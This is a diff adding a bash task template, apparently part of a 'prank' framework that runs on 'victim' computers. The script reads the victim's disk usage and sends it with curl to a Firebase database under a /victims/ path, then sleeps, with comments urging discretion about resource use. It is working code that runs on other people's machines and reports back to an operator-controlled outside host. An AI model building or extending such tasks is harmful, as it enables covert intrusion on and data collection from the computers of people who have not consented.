@@ -1,0 +1,37 @@
+#!/usr/bin/env bash
+# REST API
+# https://firebase.google.com/docs/reference/rest/database/
+
+# Get the location of this script.
+SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
+# Define the task ID
+thisTaskID="prototype"
+
+# Get some default functions and variables from the deployment
+source "$SCRIPTDIR/deploy"
+
+
+###############################################################################
+
+# Get the program parameters.
+
+victim="$1"
+rootIteration="$2"
+
+###############################################################################
+
+# Your own code
+
+# Always write data to this tasks location.
+#e.g.
+
+result=`df -h | grep '/$'`
+curl -X PUT -d "{\"df_h\" : \"$result\" }" "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
+
+###############################################################################
+
+#Finally, you should sleep as well. Try not to use the computer's resources too much,
+# It is only a prank, after all.
+
+sleep 15
